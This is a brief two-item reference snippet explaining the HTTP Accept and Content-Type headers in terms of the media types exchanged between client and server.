* `Accept` header: The media type(s) that the client tells the server it can understand.  
* `Content-Type` header: The media type(s) that the server tells the client what the response content actually is.



